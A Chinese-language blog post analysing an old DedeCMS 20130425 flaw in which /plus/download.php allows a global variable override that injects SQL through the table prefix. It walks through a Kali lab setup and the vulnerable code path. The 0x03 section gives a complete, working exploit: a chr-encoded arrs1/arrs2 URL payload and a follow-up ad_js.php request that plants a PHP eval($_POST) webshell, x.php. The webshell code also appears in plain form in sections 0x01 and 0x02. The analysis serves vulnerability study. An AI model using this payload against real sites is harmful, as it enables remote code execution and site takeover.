---
layout: post
title: "[web] dedecms download.php漏洞分析及利用"
---

该漏洞的EXP有很多文章分享，但是漏洞分析可能由于简单，所以没有人做分享，由于是第一篇文章，所以对环境的搭建也介绍一下 :)
<hr >


#### 0x0. 测试环境初始化

系统为：kali 2017.3

dedecms版本为： 20130425

web服务为： apache2

1.安装php5, php5-mysql,php5-gd,并安装apache2 php5模块

添加新的repo(为了安装php5，默认版本的源中只有php7)

	deb http://old.kali.org/kali sana main non-free contrib
	deb-src http://old.kali.org/kali sana main non-free contrib

	apt-get update

	apt-get install php5 php5-mysql php5-gd libapache2-mod-php5

2.关闭默认的apache2 php7的模块(我们测试的源码在php5版本)

	a2dismod php7.0
	systemctl restart apache2

在/var/www/html/下创建简单的info.php

	<?php phpinfo(); ?>

访问http://server-ip/info.php,检测是否能正常加载php5

3.创建mysql 库和用户权限(默认mysql kali自带)

配置mysql记录sql语句，在`/etc/mysql/mariadb.conf.d/50-server.cnf`

> general_log_file        = /var/log/mysql/mysql.log

> general_log             = 1
> 


	service mysql start
	mysql -uroot -p
	create database dedecms_20130425;
	grant all on dedecms_20130425.* to 'victim'@'127.0.0.1' identified by 'dedecms';
	flush privileges;

在/var/www/thml/下创建conn.php

	<?php
    $con = mysql_connect("127.0.0.1", "victim", "dedecms");
    if (!$con) {
        die('connect error!!!\n');
    }   
    echo "connected successfully\n";
    mysql_close($con);

访问http://server-ip/conn.php, 检测数据库连接

4.配置dedecms源码

最后将对应的dedecms的源码，放置到/var/www/html/dedecms目录下,并设置对应的权限

	chown www-data:www-data -R dedecms-20130425/	# www-data为apache2运行的用户

接着安装dedecms, http://server-ip/dedecms-20130425/install/index.php，检测画面如下

![dedecms]({{ '/images/201801/dedecms_0_1.png' | prepend: site.baseurl }})

gd我们已经安装，可以忽略这个错误，不会影响使用(后台登录可以正确识别出验证码)

![dedecms]({{ '/images/201801/dedecms_0_2.png' | prepend: site.baseurl }})

至此 我们的环境就已经搞定了

#### 0x01 漏洞描述

漏洞大致利用流程为： 先通过`/plus/download.php?open=1&arrs1[]=...&arrs2[]=...`(不展开详细的payload了)实现变量覆盖漏洞(dedecms这里是有防护变量覆盖，只是这次漏洞是由于arrs1和arrs2会在后续被chr函数处理，就是我们看到的一堆assic值)覆盖了全局变量`$_GLOBAL['cfg_dbprefix']`(payload中的arrs1就是代表的GLOBAL变量中的key值，而arrs2代表着是对应的value值)，覆盖后会在后续的`setquery`函数中将我们的payload拼接到SQL语句中，然后通过`/plus/ad_js.php?aid=1&nocache=1`的访问会将我们注入的payload查询输出到一个模板文件中，然后ad_js.php文件使用include包含该模板文件，触发了我们的payload，利用结束。

要实现getshell就需要把arrs2数组中的值直接添加`<?php $fp = @fopen(''x.php'', ''a'');@fwrite($fp, ''<?php eval($_POST[w]) ?>'');@fclose($fp);?>` 相当于`$_GLOBAL['cfg_dbprefix'] = <?php $fp = @fopen(''x.php'', ''a'');@fwrite($fp, ''<?php eval($_POST[w]) ?>'');@fclose($fp);?>`

#### 0x02 漏洞分析

数据流会先通过`download.php`中的`include/common.inc.php`,会通过以下代码检查

![dedecms]({{ '/images/201801/dedecms_2_1.png' | prepend: site.baseurl }})

下图为`_RunMagicQuotes`,在该函数中会递归检查，除了key还有value

![dedecms]({{ '/images/201801/dedecms_2_2.png' | prepend: site.baseurl }})

通过以上代码一般的变量覆盖漏洞利用是失效的，因为无法包含关键字`cfg_`

但是在检查完后的代码中，后续会判断是否引入`dedesql.class.php`文件(这个文件是利用的关键)

![dedecms]({{ '/images/201801/dedecms_2_3.png' | prepend: site.baseurl }})

cfg_mysql_type默认配置为mysqli, 后续判断的mysqli_init(一般都存在)，所以该漏洞触发是比较严苛的。

全局变量都存在`data/config.cache.inc.php`中

![dedecms]({{ '/images/201801/dedecms_2_4.png' | prepend: site.baseurl }})

关键文件`include/dedesql.class.php`文件，漏洞代码

![dedecms]({{ '/images/201801/dedecms_2_5.png' | prepend: site.baseurl }})

全局变量没有过滤arrs1，和arrs2，并且传入的值会被遍历 通过chr函数解析。

此刻可以成功替换`$_GLOBAL['cfg_dbprefix']`值

接着代码流会继续执行download.php中的以下代码

![dedecms]({{ '/images/201801/dedecms_2_6.png' | prepend: site.baseurl }})

会执行函数`ExecuteNoneQuery2`，定义在`include/dedesql.class.php`文件

![dedecms]({{ '/images/201801/dedecms_2_7.png' | prepend: site.baseurl }})

引入漏洞函数`setquery`，定义如下：

![dedecms]({{ '/images/201801/dedecms_2_8.png' | prepend: site.baseurl }})

str_replace函数就是漏洞点，`UPDATE #@__downloads SET downloads = downloads + 1 WHERE hash='$hash'` 这个是要执行的sql语句，通过setquery将`#@__`替换成为我们之前的`$_GLOBAL['cfg_dbprefix']`的值， 最终到数据库的语句就成为以下语句：

	Query UPDATE `dede_myad` SET  normbody='<?php $fp = @fopen(''x.php'', ''a'');@fwrite($fp, ''<?php eval($_POST[w]) ?>'');echo ''fuckdede'';@fclose($fp);?>'  where aid =1 #downloads` SET downloads = downloads + 1 WHERE hash='d41d8cd98f00b204e9800998ecf8427e'

会更新表`dede_myad`中的`normbody`中的值，`aid`为1.

更为关键的一点在利用中，访问`/plus/ad_js.php`,会先查询指定aid的normbody，并写入到模板，最后include触发漏洞。

![dedecms]({{ '/images/201801/dedecms_2_9.png' | prepend: site.baseurl }})

#### 0x03 漏洞利用

利用的2个前提

一个是版本：通过`/data/admin/ver.txt`来确定 我使用的20130425

另外一个： `cfg_mysql_type == "mysqli"`,这个黑盒无法判断

因此利用的话只要版本合适，直接打payload，来检测

<pre>/plus/download.php?open=1&arrs1[]=99&arrs1[]=102&arrs1[]=103&arrs1[]=95&arrs1[]=100&arrs1[]=98&arrs1[]=112&arrs1[]=114&arrs1[]=101&arrs1[]=102&arrs1[]=105&arrs1[]=120&arrs2[]=109&arrs2[]=121&arrs2[]=97&arrs2[]=100&arrs2[]=96&arrs2[]=32&arrs2[]=83&arrs2[]=69&arrs2[]=84&arrs2[]=32&arrs2[]=32&arrs2[]=110&arrs2[]=111&arrs2[]=114&arrs2[]=109&arrs2[]=98&arrs2[]=111&arrs2[]=100&arrs2[]=121&arrs2[]=61&arrs2[]=39&arrs2[]=60&arrs2[]=63&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=32&arrs2[]=36&arrs2[]=102&arrs2[]=112&arrs2[]=32&arrs2[]=61&arrs2[]=32&arrs2[]=64&arrs2[]=102&arrs2[]=111&arrs2[]=112&arrs2[]=101&arrs2[]=110&arrs2[]=40&arrs2[]=39&arrs2[]=39&arrs2[]=120&arrs2[]=46&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=39&arrs2[]=39&arrs2[]=44&arrs2[]=32&arrs2[]=39&arrs2[]=39&arrs2[]=97&arrs2[]=39&arrs2[]=39&arrs2[]=41&arrs2[]=59&arrs2[]=64&arrs2[]=102&arrs2[]=119&arrs2[]=114&arrs2[]=105&arrs2[]=116&arrs2[]=101&arrs2[]=40&arrs2[]=36&arrs2[]=102&arrs2[]=112&arrs2[]=44&arrs2[]=32&arrs2[]=39&arrs2[]=39&arrs2[]=60&arrs2[]=63&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=32&arrs2[]=101&arrs2[]=118&arrs2[]=97&arrs2[]=108&arrs2[]=40&arrs2[]=36&arrs2[]=95&arrs2[]=80&arrs2[]=79&arrs2[]=83&arrs2[]=84&arrs2[]=91&arrs2[]=119&arrs2[]=93&arrs2[]=41&arrs2[]=32&arrs2[]=63&arrs2[]=62&arrs2[]=39&arrs2[]=39&arrs2[]=41&arrs2[]=59&arrs2[]=101&arrs2[]=99&arrs2[]=104&arrs2[]=111&arrs2[]=32&arrs2[]=39&arrs2[]=39&arrs2[]=102&arrs2[]=117&arrs2[]=99&arrs2[]=107&arrs2[]=100&arrs2[]=101&arrs2[]=100&arrs2[]=101&arrs2[]=39&arrs2[]=39&arrs2[]=59&arrs2[]=64&arrs2[]=102&arrs2[]=99&arrs2[]=108&arrs2[]=111&arrs2[]=115&arrs2[]=101&arrs2[]=40&arrs2[]=36&arrs2[]=102&arrs2[]=112&arrs2[]=41&arrs2[]=59&arrs2[]=63&arrs2[]=62&arrs2[]=39&arrs2[]=32&arrs2[]=32&arrs2[]=119&arrs2[]=104&arrs2[]=101&arrs2[]=114&arrs2[]=101&arrs2[]=32&arrs2[]=97&arrs2[]=105&arrs2[]=100&arrs2[]=32&arrs2[]=61&arrs2[]=49&arrs2[]=32&arrs2[]=35
/plus/ad_js.php?aid=1&nocache=1

如果利用成功会在/plus/目录下写入x.php文件。
</pre>

#### 0x04 总结

漏洞利用可以能比较严格,漏洞虽然比较老，而且现在也找不到太多的实战目标， 不过通过了解漏洞的本质，可以让自己对漏洞的判断更加精确，让自己的基础更扎实。
